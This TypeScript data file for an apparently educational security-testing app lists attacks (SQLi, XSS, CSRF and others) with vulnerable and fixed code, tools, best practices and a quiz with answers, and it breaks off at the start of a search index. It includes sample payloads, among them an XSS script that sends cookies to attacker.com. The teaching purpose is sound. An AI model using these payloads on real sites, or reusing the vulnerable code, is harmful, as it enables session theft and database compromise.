import {
  AttackInfo,
  SecurityTypeInfo,
  SecurityTool,
  ProcessPhase,
  BestPracticeItem,
  QuizQuestion,
  SearchItem
} from '../types';

export const ABOUT_SECURITY_TESTING = {
  title: "What is Security Testing?",
  definition: "Security testing is a software testing technique designed to uncover vulnerabilities, threats, and risks in a application or network to prevent malicious attacks from intruders.",
  whyImportant: "In today's digital landscape, web applications store sensitive user financial records, passwords, and personal information. A single unpatched vulnerability can lead to massive data breaches, financial loss, regulatory fines, and permanent reputational damage.",
  goals: [
    {
      title: "Identify Threats & Vulnerabilities",
      description: "Detect security flaws before malicious actors can discover and exploit them.",
      icon: "ShieldAlert"
    },
    {
      title: "Ensure Compliance",
      description: "Adhere to industry regulations like GDPR, HIPAA, PCI-DSS, and ISO 27001.",
      icon: "FileCheck"
    },
    {
      title: "Protect Data Confidentiality",
      description: "Ensure that sensitive data is accessible only to authorized entities.",
      icon: "Lock"
    },
    {
      title: "Maintain System Availability",
      description: "Prevent Denial of Service (DoS) attacks and ensure uninterrupted service uptime.",
      icon: "Server"
    }
  ],
  benefits: [
    "Prevents expensive security breaches and downtime",
    "Builds client and user trust in your application",
    "Reduces cost of bug fixes by catching flaws early in Development (Shift Left)",
    "Ensures compliance with legal and security standards",
    "Provides actionable remediation guidance for developers"
  ],
  ciaTriad: [
    {
      name: "Confidentiality",
      desc: "Data is accessible only to authorized users.",
      example: "Encrypting passwords with Argon2 / bcrypt and using HTTPS."
    },
    {
      name: "Integrity",
      desc: "Information is accurate and cannot be tampered with.",
      example: "Using cryptographic hashes and digital signatures for integrity checks."
    },
    {
      name: "Availability",
      desc: "Services and data are reachable whenever required.",
      example: "Deploying rate limiters, firewalls, and DDoS mitigation."
    }
  ]
};

export const SECURITY_TYPES: SecurityTypeInfo[] = [
  {
    id: "vulnerability-scanning",
    title: "Vulnerability Scanning",
    iconName: "Search",
    shortDesc: "Automated inspection of software and networks to detect known security flaws and outdated software components.",
    fullDesc: "Vulnerability Scanning uses automated tools to search web applications, servers, and network devices for known signatures of vulnerabilities (such as unpatched CVEs, default configurations, or open ports). It is fast and scalable.",
    keyActivities: [
      "Running scheduled automated scanners (Nessus, OWASP ZAP)",
      "Checking software dependencies against CVE databases",
      "Identifying default credentials and exposed administrative ports",
      "Generating vulnerability priority reports"
    ],
    whenToPerform: "Continuously in CI/CD pipelines and monthly network audits.",
    targetAudience: "Security teams, System Administrators, DevOps Engineers",
    bestTools: ["OWASP ZAP", "Nessus", "Snyk", "OpenVAS"]
  },
  {
    id: "penetration-testing",
    title: "Penetration Testing (Pen Test)",
    iconName: "Bug",
    shortDesc: "Simulated ethical cyber attack to safely evaluate system defenses and uncover zero-day or logic vulnerabilities.",
    fullDesc: "Penetration Testing involves ethical hackers attempting to actively exploit vulnerabilities in a controlled environment to see how far an attacker could penetrate your systems and what data could be accessed.",
    keyActivities: [
      "Reconnaissance and threat intelligence gathering",
      "Manual exploitation of business logic flaws",
      "Privilege escalation and lateral movement simulations",
      "Comprehensive proof-of-concept reporting and remediation guidance"
    ],
    whenToPerform: "Annually, before major release launches, or after major architectural changes.",
    targetAudience: "Ethical Hackers, Security Consultants, QA Engineers",
    bestTools: ["Burp Suite", "Metasploit", "Nmap", "Kali Linux"]
  },
  {
    id: "authentication-testing",
    title: "Authentication Testing",
    iconName: "KeyRound",
    shortDesc: "Evaluating login systems, password policies, MFA enforcement, and identity verification mechanisms.",
    fullDesc: "Authentication verifies who a user is. Testing ensures that attackers cannot bypass login forms through brute-force attacks, credential stuffing, SQL injection, default credentials, or weak password reset tokens.",
    keyActivities: [
      "Testing password strength policies and account lockout thresholds",
      "Attempting bypass of Multi-Factor Authentication (MFA)",
      "Analyzing password reset flow security and token randomness",
      "Verifying secure storage of password hashes (bcrypt, Argon2)"
    ],
    whenToPerform: "During initial user authentication development and security audits.",
    targetAudience: "Full-stack Developers, QA Testers",
    bestTools: ["Burp Suite", "Hydra", "OWASP ZAP"]
  },
  {
    id: "authorization-testing",
    title: "Authorization Testing",
    iconName: "ShieldCheck",
    shortDesc: "Checking access controls to ensure users can only access endpoints and data permitted for their specific role.",
    fullDesc: "Authorization verifies what a user is allowed to do. Testing checks for Broken Object Level Authorization (BOLA/IDOR) and Broken Function Level Authorization where a standard user might access admin functionality.",
    keyActivities: [
      "Testing for Insecure Direct Object References (IDOR)",
      "Verifying Role-Based Access Control (RBAC) across all API endpoints",
      "Attempting parameter tampering to elevate permissions (e.g. role='admin')",
      "Ensuring tenant isolation in multi-tenant SaaS platforms"
    ],
    whenToPerform: "Whenever creating new API endpoints, user roles, or permissions.",
    targetAudience: "Backend Developers, API Designers, Pen Testers",
    bestTools: ["Postman", "Burp Suite Autorize", "OWASP ZAP"]
  },
  {
    id: "session-testing",
    title: "Session Management Testing",
    iconName: "Timer",
    shortDesc: "Analyzing JWTs, cookies, session timeouts, and token validation to prevent session hijacking.",
    fullDesc: "Session Testing verifies that user sessions are generated randomly, protected in transit, stored securely (e.g., HttpOnly, Secure, SameSite cookies), and revoked cleanly upon logout or inactivity.",
    keyActivities: [
      "Checking cookie security flags (HttpOnly, Secure, SameSite=Strict)",
      "Testing JWT signature verification and algorithm substitution (e.g., 'none' alg)",
      "Verifying session expiration on server side after logout",
      "Checking for session fixation and token predictability"
    ],
    whenToPerform: "During web application state & session design.",
    targetAudience: "Frontend & Backend Engineers",
    bestTools: ["Chrome DevTools", "Burp Suite", "Jwt.io"]
  },
  {
    id: "data-security-testing",
    title: "Data Security Testing",
    iconName: "Database",
    shortDesc: "Verifying encryption in transit (TLS/HTTPS) and at rest, data masking, and sensitive storage practices.",
    fullDesc: "Data Security Testing ensures confidential information (PII, credit card details, API keys) remains encrypted both while travelling over the network and when stored in databases or local storage.",
    keyActivities: [
      "Checking SSL/TLS cipher suites and certificate validity",
      "Ensuring API keys or connection strings are not exposed in frontend code",
      "Verifying database field-level encryption for sensitive attributes",
      "Checking for leakage of sensitive data in server logs or error pages"
    ],
    whenToPerform: "Continuously during code reviews and infrastructure deployment.",
    targetAudience: "Database Administrators, Security Architects",
    bestTools: ["SSL Labs Test", "GitGuardian", "TruffleHog"]
  }
];

export const COMMON_ATTACKS: AttackInfo[] = [
  {
    id: "sql-injection",
    name: "SQL Injection (SQLi)",
    shortName: "SQLi",
    category: "Injection",
    severity: "Critical",
    description: "Occurs when malicious SQL commands are inserted into data input fields, allowing attackers to manipulate database queries.",
    explanation: "If an application concatenates raw user input directly into a database query string, an attacker can input special characters like `' OR '1'='1` to force the database to execute unintended commands, bypass logins, or extract entire database tables.",
    realWorldExample: "An attacker types `' OR 1=1 --` into a username field on a vulnerable login form, forcing the SQL query to return `TRUE` for every record and logging them in as the administrator.",
    vulnerableCode: {
      language: "javascript",
      code: `// VULNERABLE CODE (Direct string concatenation)
const query = "SELECT * FROM users WHERE username = '" + req.body.username + "' AND password = '" + req.body.password + "'";
db.query(query, (err, result) => {
  // If result exists, user is logged in
});`,
      explanation: "Directly placing req.body.username into the SQL string allows an input like `' OR '1'='1` to alter the logic of the query."
    },
    preventedCode: {
      language: "javascript",
      code: `// PREVENTED CODE (Parameterized Queries / Prepared Statements)
const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [req.body.username, req.body.password], (err, result) => {
  // Database treats user input strictly as literal string values
});`,
      explanation: "Parameterized queries separate the query structure from user input data, rendering injected SQL characters harmless."
    },
    preventionMethods: [
      "Use Parameterized Queries (Prepared Statements) for all database operations",
      "Use Object-Relational Mappers (ORMs) like Prisma, Drizzle, or TypeORM",
      "Apply strict input validation with whitelist regex patterns",
      "Enforce Least Privilege database account permissions"
    ],
    impact: [
      "Unauthorized access to sensitive database records",
      "Data destruction or modification",
      "Potential Remote Code Execution on database server"
    ]
  },
  {
    id: "cross-site-scripting",
    name: "Cross-Site Scripting (XSS)",
    shortName: "XSS",
    category: "Client-Side",
    severity: "High",
    description: "Occurs when an application includes untrusted data in a web page without proper validation or escaping, executing malicious JavaScript in victim browsers.",
    explanation: "Attackers inject client-side scripts into web pages viewed by other users. The victim's browser executes the script, enabling the attacker to steal session cookies, capture keypresses, or redirect users to malicious websites.",
    realWorldExample: "A user posts a comment on a blog containing `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`. Every user who reads the comment runs that script automatically.",
    vulnerableCode: {
      language: "html",
      code: `<!-- VULNERABLE CODE (Unescaped HTML rendering) -->
<div id="user-comment">
  <!-- Inserted directly from database via innerHTML -->
  <script>document.body.innerHTML = 'Hacked!';</script>
</div>`,
      explanation: "Setting innerHTML directly executes any inline <script> tags or onerror image handlers present in user input."
    },
    preventedCode: {
      language: "javascript",
      code: `// PREVENTED CODE (Context-aware escaping / textContent)
const commentElement = document.getElementById("user-comment");
commentElement.textContent = userInput; // Escapes HTML tags safely

// In React, default JSX expressions {userInput} are safely escaped automatically!`,
      explanation: "Using textContent or React's standard JSX escaping converts special characters (<, >, &, \") into harmless HTML entities."
    },
    preventionMethods: [
      "Context-aware HTML, JavaScript, and CSS output encoding",
      "Implement a strong Content Security Policy (CSP) header",
      "Use HttpOnly cookies so JavaScript cannot access session tokens",
      "Sanitize rich HTML input using trusted libraries like DOMPurify"
    ],
    impact: [
      "Session cookie theft & account takeover",
      "Defacement of web pages",
      "Keystroke logging and credential harvesting"
    ]
  },
  {
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    shortName: "CSRF",
    category: "Client-Side",
    severity: "High",
    description: "Forces an authenticated user's browser to send unauthorized HTTP requests to a vulnerable web application.",
    explanation: "If an app relies solely on cookies for authentication, an attacker can create a malicious website with an auto-submitting form that targets `http://vulnerable-bank.com/transfer`. If the victim visits the malicious site while logged in to their bank, the browser automatically attaches the bank cookies.",
    realWorldExample: "An attacker sends an email containing an embedded image tag: `<img src='http://bank.com/transfer?to=attacker&amount=1000'>`. When viewed in a browser logged into the bank, the money transfer request fires.",
    vulnerableCode: {
      language: "javascript",
      code: `// VULNERABLE CODE (Accepts cookie authentication without anti-CSRF token)
app.post("/api/change-email", (req, res) => {
  // Automatically trusts req.cookies.sessionId
  const userId = req.user.id;
  updateEmail(userId, req.body.email);
});`,
      explanation: "The server checks cookie identity, but cannot distinguish if the request was initiated intentionally by the user or forged by a malicious site."
    },
    preventedCode: {
      language: "javascript",
      code: `// PREVENTED CODE (Anti-CSRF Tokens + SameSite Cookies)
// 1. Set cookie with SameSite=Strict flag
res.cookie('session', sessionId, { sameSite: 'strict', httpOnly: true, secure: true });

// 2. Validate Anti-CSRF token in HTTP headers
app.post("/api/change-email", verifyCsrfToken, (req, res) => {
  updateEmail(req.user.id, req.body.email);
});`,
      explanation: "Anti-CSRF tokens are unique, unpredictable values sent in headers that malicious cross-origin pages cannot read or attach."
    },
    preventionMethods: [
      "Implement Anti-CSRF tokens (Synchronizer Token Pattern or Double Submit Cookie)",
      "Set SameSite=Strict or SameSite=Lax on all session cookies",
      "Require re-authentication for sensitive operations (e.g. password change)",
      "Avoid using GET requests for state-changing actions"
    ],
    impact: [
      "Unauthorized financial transactions",
      "Password and email address changes",
      "Unauthorized administrative actions"
    ]
  },
  {
    id: "brute-force",
    name: "Brute Force & Credential Stuffing",
    shortName: "Brute Force",
    category: "Authentication",
    severity: "Medium",
    description: "Automated trial-and-error attempts to guess passwords, API keys, or login credentials.",
    explanation: "Attackers use automated scripts to systematically test thousands or millions of password combinations against login endpoints until the correct credentials are found.",
    realWorldExample: "An attacker uses a list of 10 million leaked usernames and passwords (credential stuffing) to test logins on an e-commerce site, compromising accounts with reused passwords.",
    vulnerableCode: {
      language: "javascript",
      code: `// VULNERABLE CODE (No rate limiting or account lockout)
app.post("/login", async (req, res) => {
  const user = await findUser(req.body.username);
  if (user && await checkPassword(req.body.password, user.hash)) {
    return res.json({ status: "success" });
  }
  return res.status(401).json({ status: "invalid" });
});`,
      explanation: "Allows unlimited login attempts per second from any IP address without throttling."
    },
    preventedCode: {
      language: "javascript",
      code: `// PREVENTED CODE (Rate Limiting + IP Blocking + Lockout)
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Limit each IP to 5 login attempts per window
  message: "Too many failed attempts. Please try again in 15 minutes."
});

app.post("/login", loginLimiter, async (req, res) => { ... });`,
      explanation: "Enforces strict limits on login attempt frequency to make automated guessing mathematically infeasible."
    },
    preventionMethods: [
      "Enforce Rate Limiting per IP address and account username",
      "Implement Multi-Factor Authentication (MFA)",
      "Use CAPTCHA on login forms after 3 failed attempts",
      "Implement temporary account lockouts and password complexity requirements"
    ],
    impact: [
      "Unauthorized account takeovers",
      "Server resource exhaustion",
      "Data theft from compromised accounts"
    ]
  },
  {
    id: "broken-authentication",
    name: "Broken Authentication",
    shortName: "Broken Auth",
    category: "Authentication",
    severity: "High",
    description: "Flaws in session management, token validation, or credential handling that allow attackers to compromise identity.",
    explanation: "Occurs when authentication logic allows weak session IDs, exposed reset tokens in URLs, failure to invalidate tokens after logout, or weak hashing algorithms like MD5.",
    realWorldExample: "An application generates sequential session IDs (`session=1001`, `session=1002`). An attacker simply increments the cookie value to log in as other active users.",
    vulnerableCode: {
      language: "javascript",
      code: `// VULNERABLE CODE (Weak, predictable session tokens)
const sessionId = user.id + "-" + Date.now(); // Easily guessable!
res.cookie("session", sessionId);`,
      explanation: "Sequential or time-based session IDs are easily predictable and forgeable by attackers."
    },
    preventedCode: {
      language: "javascript",
      code: `// PREVENTED CODE (Cryptographically secure random token generation)
import crypto from "crypto";

const sessionId = crypto.randomBytes(32).toString("hex"); // 256 bits of entropy
res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" });`,
      explanation: "Cryptographically random tokens (e.g. 256-bit entropy) cannot be guessed or brute-forced."
    },
    preventionMethods: [
      "Use cryptographically secure random session generators (`crypto.randomBytes`)",
      "Store passwords using strong salted hashing algorithms (Argon2, bcrypt)",
      "Expire sessions after inactivity and invalidate tokens on logout",
      "Never put sensitive session tokens in URL parameters"
    ],
    impact: [
      "Complete user identity compromise",
      "Unauthorized access to user profile & private data"
    ]
  },
  {
    id: "clickjacking",
    name: "Clickjacking (UI Redress Attack)",
    shortName: "Clickjacking",
    category: "Client-Side",
    severity: "Medium",
    description: "Tricking a user into clicking an invisible or disguised element on a malicious site overlaid on an invisible iframe.",
    explanation: "An attacker embeds your web page inside an invisible `<iframe>` on their malicious site. They place enticing buttons (e.g., 'Claim Free Gift') directly above sensitive buttons in your iframe (e.g., 'Delete Account' or 'Transfer Money').",
    realWorldExample: "A user visits a gaming site and clicks a 'Play Game' button, but actually clicks an invisible 'Transfer Funds' button on an embedded online banking iframe.",
    vulnerableCode: {
      language: "html",
      code: `<!-- VULNERABLE APPLICATION (Allows framing by any origin) -->
<!-- Missing X-Frame-Options or Content-Security-Policy headers -->
<iframe>My Website Content</iframe>`,
      explanation: "Without frame headers, any third-party website can load your web application in an iframe."
    },
    preventedCode: {
      language: "javascript",
      code: `// PREVENTED CODE (HTTP Response Headers)
// Set HTTP response headers to block framing:
res.setHeader("X-Frame-Options", "DENY"); // or "SAMEORIGIN"

// Modern Content Security Policy header:
res.setHeader("Content-Security-Policy", "frame-ancestors 'none';");`,
      explanation: "Instructs browser rendering engines to refuse embedding the page in iframes from unauthorized origins."
    },
    preventionMethods: [
      "Send `Content-Security-Policy: frame-ancestors 'none';` headers",
      "Send `X-Frame-Options: DENY` or `SAMEORIGIN` headers",
      "Use frame-busting JavaScript scripts as secondary defense"
    ],
    impact: [
      "Unintended state-changing user actions",
      "Social engineering and privilege abuse"
    ]
  }
];

export const PROCESS_TIMELINE: ProcessPhase[] = [
  {
    stepNumber: 1,
    phaseName: "Requirement Analysis & Scope Definition",
    shortDesc: "Define target applications, boundaries, rules of engagement, and compliance criteria.",
    detailedDesc: "Before running any tests, establish clear boundaries with stakeholders: what servers, IPs, and endpoints are in-scope vs out-of-scope, allowable testing windows, and legal authorizations.",
    keyTasks: [
      "Identify target URLs, APIs, and hosting environments",
      "Establish rules of engagement and signed legal consent",
      "Define security objectives and compliance standards (e.g., OWASP Top 10)",
      "Obtain credentials for different role levels (Admin, User, Guest)"
    ],
    deliverables: ["Security Test Plan", "Rules of Engagement Document", "Scope Agreement"],
    iconName: "FileText"
  },
  {
    stepNumber: 2,
    phaseName: "Threat Identification & Architecture Review",
    shortDesc: "Map the application architecture, data flows, and potential threat vectors.",
    detailedDesc: "Analyze how data moves through the application. Perform threat modeling to discover potential entry points, high-risk assets, and authorization boundaries.",
    keyTasks: [
      "Draw Data Flow Diagrams (DFDs) across client, API, and database",
      "Conduct Threat Modeling using frameworks like STRIDE",
      "Review authentication mechanisms and third-party integrations",
      "Identify high-value targets (payment flows, user PII)"
    ],
    deliverables: ["Threat Model Diagram", "High-Risk Asset Inventory"],
    iconName: "Radar"
  },
  {
    stepNumber: 3,
    phaseName: "Vulnerability Scanning",
    shortDesc: "Execute automated tools to quickly uncover known vulnerabilities and misconfigurations.",
    detailedDesc: "Run automated scanners to establish a baseline of open ports, outdated software packages, unencrypted channels, and common web flaws.",
    keyTasks: [
      "Run SAST (Static Application Security Testing) on source code",
      "Run DAST (Dynamic Application Security Testing) with OWASP ZAP or Burp",
      "Scan network ports and web server configurations",
      "Check third-party dependencies for known CVE vulnerabilities"
    ],
    deliverables: ["Automated Scan Results", "Vulnerability Inventory"],
    iconName: "Scan"
  },
  {
    stepNumber: 4,
    phaseName: "Manual Penetration Testing",
    shortDesc: "Perform targeted manual exploitation to eliminate false positives and catch business logic flaws.",
    detailedDesc: "Automated scanners miss complex logic errors. Ethical hackers manually test authentication bypasses, privilege escalation (IDOR), and complex injection flows.",
    keyTasks: [
      "Test for Broken Object Level Authorization (BOLA/IDOR)",
      "Manipulate HTTP requests and session parameters in proxy tools",
      "Test custom business logic workflows for loopholes",
      "Chain multiple low-severity issues to demonstrate real impact"
    ],
    deliverables: ["Exploit Proofs-of-Concept (PoCs)", "Verified Findings List"],
    iconName: "Crosshair"
  },
  {
    stepNumber: 5,
    phaseName: "Reporting & Risk Classification",
    shortDesc: "Document findings with clear CVSS scores, step-by-step reproduction steps, and fix guidance.",
    detailedDesc: "Compile technical details into a structured report categorized by severity (Critical, High, Medium, Low) with clear instructions for developers.",
    keyTasks: [
      "Assign CVSS v3/v4 severity scores to uncovered vulnerabilities",
      "Write concise step-by-step reproduction instructions",
      "Provide specific code remediation examples",
      "Prepare executive summary for technical leadership"
    ],
    deliverables: ["Comprehensive Security Audit Report", "Executive Summary Presentation"],
    iconName: "ClipboardList"
  },
  {
    stepNumber: 6,
    phaseName: "Remediation & Patching",
    shortDesc: "Software development teams implement recommended code fixes and configuration updates.",
    detailedDesc: "Developers review the security findings, apply patch updates, update dependencies, and implement security controls.",
    keyTasks: [
      "Prioritize fixes starting with Critical and High severity issues",
      "Update libraries and patch server configurations",
      "Refactor vulnerable code paths using parameterized patterns",
      "Conduct code review of implemented security patches"
    ],
    deliverables: ["Patched Codebase", "Pull Request Approvals"],
    iconName: "Wrench"
  },
  {
    stepNumber: 7,
    phaseName: "Retesting & Verification",
    shortDesc: "Re-run security tests to confirm vulnerabilities are resolved without introducing regressions.",
    detailedDesc: "The security team retests modified endpoints to verify that the fix is effective and that no new vulnerabilities were introduced.",
    keyTasks: [
      "Execute targeted manual retests against fixed endpoints",
      "Run automated regression tests in staging environment",
      "Verify that patches cannot be easily bypassed",
      "Issue final clean security certificate or verification sign-off"
    ],
    deliverables: ["Final Retest Attestation", "Clean Security Audit Sign-off"],
    iconName: "CheckCircle2"
  }
];

export const SECURITY_TOOLS: SecurityTool[] = [
  {
    id: "owasp-zap",
    name: "OWASP ZAP",
    category: "Scanner",
    logoIcon: "Shield",
    description: "The world's most widely used free and open-source web application security scanner maintained by OWASP.",
    primaryUse: "Automated vulnerability scanning, spidering websites, and dynamic intercepting proxy for web traffic.",
    difficulty: "Beginner",
    sampleCommand: "zap-cli quick-scan --self-contained -u http://target.local",
    keyFeatures: [
      "Automated spider & crawler",
      "Intercepting HTTP proxy",
      "Passive & active vulnerability scanning",
      "REST API integration for CI/CD"
    ],
    officialUrl: "https://www.zaproxy.org/"
  },
  {
    id: "burp-suite",
    name: "Burp Suite",
    category: "Proxy",
    logoIcon: "Layers",
    description: "The industry-standard toolkit for web application security testing and ethical hacking.",
    primaryUse: "Intercepting HTTP traffic, request repeater, intruder brute-forcing, and advanced web vulnerability analysis.",
    difficulty: "Intermediate",
    sampleCommand: "Burp proxy listening on 127.0.0.1:8080",
    keyFeatures: [
      "Fine-grained HTTP request/response interception & modification",
      "Repeater module for manual payload crafting",
      "Intruder for automated parameter fuzzing",
      "Extensible with BApp Store plugins"
    ],
    officialUrl: "https://portswigger.net/burp"
  },
  {
    id: "nessus",
    name: "Tenable Nessus",
    category: "Scanner",
    logoIcon: "Server",
    description: "A gold-standard vulnerability assessment scanner used for infrastructure, OS, and cloud configuration scanning.",
    primaryUse: "Network-wide vulnerability scanning, misconfiguration detection, and compliance auditing.",
    difficulty: "Intermediate",
    sampleCommand: "nessuscli scan --start --id=1",
    keyFeatures: [
      "Over 70,000 CVE plugins",
      "In-depth host and network auditing",
      "Compliance policy verification (CIS Benchmarks)",
      "Low false-positive rate"
    ],
    officialUrl: "https://www.tenable.com/products/nessus"
  },
  {
    id: "nmap",
    name: "Nmap (Network Mapper)",
    category: "Network",
    logoIcon: "Network",
    description: "Free and open-source utility for network discovery, open port scanning, and OS detection.",
    primaryUse: "Discovering active network hosts, open ports, running services, and firewall rule auditing.",
    difficulty: "Beginner",
    sampleCommand: "nmap -sV -sC -p 1-1000 target.com",
    keyFeatures: [
      "Port scanning (TCP SYN, UDP, Connect)",
      "Service and version detection",
      "Nmap Scripting Engine (NSE) for vulnerability checks",
      "OS fingerprinting"
    ],
    officialUrl: "https://nmap.org/"
  },
  {
    id: "wireshark",
    name: "Wireshark",
    category: "Sniffer",
    logoIcon: "Activity",
    description: "The world's foremost network protocol analyzer that lets you capture and interactively browse network traffic.",
    primaryUse: "Deep packet inspection, network troubleshooting, protocol analysis, and unencrypted data leakage detection.",
    difficulty: "Intermediate",
    sampleCommand: "tshark -i eth0 -f 'tcp port 80'",
    keyFeatures: [
      "Deep inspection of hundreds of protocols",
      "Live packet capture and offline analysis",
      "Rich display filter syntax",
      "TLS decryption with session keys"
    ],
    officialUrl: "https://www.wireshark.org/"
  },
  {
    id: "metasploit",
    name: "Metasploit Framework",
    category: "Framework",
    logoIcon: "Terminal",
    description: "A powerful penetration testing framework used to develop and execute exploit code against target systems.",
    primaryUse: "Simulating attacks, verifying vulnerability exploitability, and post-exploitation testing.",
    difficulty: "Advanced",
    sampleCommand: "msfconsole -q -x 'use exploit/multi/handler'",
    keyFeatures: [
      "Database of over 2,000 verified exploits",
      "Payload generation (Meterpreter)",
      "Automated auxiliary scanners",
      "Post-exploitation module suites"
    ],
    officialUrl: "https://www.metasploit.com/"
  }
];

export const BEST_PRACTICES: BestPracticeItem[] = [
  {
    id: "bp-passwords",
    title: "Enforce Strong Password Policies & Hashing",
    category: "Authentication",
    description: "Require minimum 12+ characters and hash stored passwords using Argon2id or bcrypt with high work factors.",
    impactLevel: "Critical",
    implementationTip: "Never store plain text passwords or simple MD5/SHA256 hashes without salt. Use bcrypt (work factor >= 12) or Argon2id."
  },
  {
    id: "bp-mfa",
    title: "Enable Multi-Factor Authentication (MFA)",
    category: "Authentication",
    description: "Implement time-based TOTP (Google Authenticator) or WebAuthn hardware keys for all accounts.",
    impactLevel: "Critical",
    implementationTip: "MFA blocks over 99% of automated account takeover attacks even if a password is compromised."
  },
  {
    id: "bp-input-validation",
    title: "Validate & Sanitize All User Inputs",
    category: "Input Handling",
    description: "Adopt an 'allow-list' approach for all incoming inputs across forms, query params, headers, and API bodies.",
    impactLevel: "Critical",
    implementationTip: "Use schema validation libraries (e.g. Zod, Joi) to strictly validate type, length, and format before processing."
  },
  {
    id: "bp-encryption",
    title: "Encrypt Sensitive Data at Rest and in Transit",
    category: "Data Protection",
    description: "Enforce HTTPS (TLS 1.3) with HSTS headers for transit, and AES-256 for sensitive database fields.",
    impactLevel: "Critical",
    implementationTip: "Include Strict-Transport-Security (HSTS) headers to force browsers to use secure HTTPS connections exclusively."
  },
  {
    id: "bp-updates",
    title: "Keep Dependencies & Software Updated",
    category: "Infrastructure",
    description: "Regularly audit third-party npm, pip, or docker packages for known CVE vulnerabilities.",
    impactLevel: "High",
    implementationTip: "Set up automated dependency monitoring tools like Dependabot or Snyk in your CI/CD pipelines."
  },
  {
    id: "bp-https",
    title: "Enforce HTTPS & Secure Cookie Flags",
    category: "Infrastructure",
    description: "Set HttpOnly, Secure, and SameSite=Strict/Lax flags on all authentication cookies.",
    impactLevel: "High",
    implementationTip: "HttpOnly prevents XSS scripts from reading cookies, while SameSite blocks cross-site request forgery attacks."
  },
  {
    id: "bp-audits",
    title: "Conduct Regular Security Audits & Code Reviews",
    category: "Auditing",
    description: "Schedule periodic manual code reviews, SAST scans, and third-party penetration tests.",
    impactLevel: "High",
    implementationTip: "Establish a clear Security Champions program where team members review PRs for security standards."
  }
];

export const QUIZ_QUESTIONS: QuizQuestion[] = [
  {
    id: 1,
    question: "What is the primary objective of Security Testing?",
    options: [
      "To check if the application runs fast under heavy traffic",
      "To identify vulnerabilities and threats before attackers can exploit them",
      "To design user interfaces and color schemes",
      "To verify if business logic complies with user interface design"
    ],
    correctIndex: 1,
    explanation: "Security testing focuses on identifying flaws, vulnerabilities, and security risks in software to ensure confidentiality, integrity, and availability.",
    topic: "Basics",
    difficulty: "Easy"
  },
  {
    id: 2,
    question: "Which mechanism effectively prevents SQL Injection vulnerabilities?",
    options: [
      "Encrypting frontend JavaScript code",
      "Using Parameterized Queries (Prepared Statements)",
      "Using GET requests instead of POST requests",
      "Disabling CSS styles in the user browser"
    ],
    correctIndex: 1,
    explanation: "Parameterized queries separate the query code structure from user data inputs, preventing database interpreters from executing user data as code.",
    topic: "Attacks",
    difficulty: "Easy"
  },
  {
    id: 3,
    question: "What type of attack involves executing malicious JavaScript code in a victim's browser?",
    options: [
      "SQL Injection (SQLi)",
      "Cross-Site Scripting (XSS)",
      "Denial of Service (DoS)",
      "Man-in-the-Middle (MitM)"
    ],
    correctIndex: 1,
    explanation: "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into trusted websites viewed by other users.",
    topic: "Attacks",
    difficulty: "Easy"
  },
  {
    id: 4,
    question: "What does the 'HttpOnly' flag on a session cookie accomplish?",
    options: [
      "Enforces cookie expiration after 5 minutes",
      "Prevents client-side JavaScript from reading or manipulating the cookie via document.cookie",
      "Encrypts the cookie using AES-256 on the database",
      "Allows the cookie to be sent over HTTP without SSL"
    ],
    correctIndex: 1,
    explanation: "The HttpOnly cookie flag blocks client-side scripts from accessing the cookie, offering strong protection against session theft via XSS.",
    topic: "Session Security",
    difficulty: "Medium"
  },
  {
    id: 5,
    question: "In authorization testing, what does BOLA / IDOR stand for?",
    options: [
      "Broken Object Level Authorization / Insecure Direct Object Reference",
      "Basic Object Logic Algorithm / Internal Data Object Rendering",
      "Binary Output Level Authentication / Intermittent Direct Online Request",
      "Broad Operations Level Access / Identity Domain Object Reset"
    ],
    correctIndex: 0,
    explanation: "BOLA (Broken Object Level Authorization) / IDOR happens when an API endpoint uses user-supplied IDs to access objects without verifying if the user owns that object.",
    topic: "Types",
    difficulty: "Medium"
  },
  {
    id: 6,
    question: "Which cookie attribute prevents Cross-Site Request Forgery (CSRF) by preventing browsers from sending the cookie on cross-site requests?",
    options: [
      "Domain",
      "Path",
      "SameSite (Strict or Lax)",
      "Expires"
    ],
    correctIndex: 2,
    explanation: "SameSite=Strict prevents the browser from attaching cookies on cross-site requests, effectively neutralizing CSRF attacks.",
    topic: "Attacks",
    difficulty: "Medium"
  },
  {
    id: 7,
    question: "What is the key difference between SAST and DAST security testing?",
    options: [
      "SAST tests mobile apps while DAST tests desktop software",
      "SAST analyzes source code without executing it (Static), while DAST tests running applications externally (Dynamic)",
      "SAST is performed manually while DAST is only theoretical",
      "SAST tests database hardware while DAST tests Wi-Fi routers"
    ],
    correctIndex: 1,
    explanation: "Static Application Security Testing (SAST) inspects source code directly (white-box), while Dynamic Application Security Testing (DAST) inspects running applications from the outside (black-box).",
    topic: "Process",
    difficulty: "Medium"
  },
  {
    id: 8,
    question: "Which open-source tool is primarily used for network discovery and open port scanning?",
    options: [
      "Burp Suite",
      "Nmap",
      "DOMPurify",
      "ESLint"
    ],
    correctIndex: 1,
    explanation: "Nmap (Network Mapper) is the industry standard for network discovery, service identification, and open port scanning.",
    topic: "Tools",
    difficulty: "Easy"
  },
  {
    id: 9,
    question: "What principle states that a user or component should possess only the minimal access permissions necessary to perform its legitimate function?",
    options: [
      "Principle of Least Privilege (PoLP)",
      "Principle of Maximum Redundancy",
      "Principle of Open Access",
      "Principle of Obscurity"
    ],
    correctIndex: 0,
    explanation: "The Principle of Least Privilege dictates that accounts should only have the minimum permissions needed, mitigating the impact if an account is compromised.",
    topic: "Best Practices",
    difficulty: "Medium"
  },
  {
    id: 10,
    question: "In the CIA Triad of cybersecurity, what does 'Integrity' ensure?",
    options: [
      "Data is accessible 24/7 without latency",
      "Information is accurate, untampered, and protected from unauthorized modification",
      "Passwords are changed every 30 days automatically",
      "Source code is hidden from search engines"
    ],
    correctIndex: 1,
    explanation: "Integrity ensures that data remains accurate and unaltered during transit or storage, guarding against malicious modification.",
    topic: "Basics",
    difficulty: "Easy"
  }
];

export const SEARCH_INDEX: SearchItem[] = [
  { id: "s-sqli", title: "SQL Injection", type: "Attack", description: "Inserting malicious SQL into queries", sectionId: "attacks" },
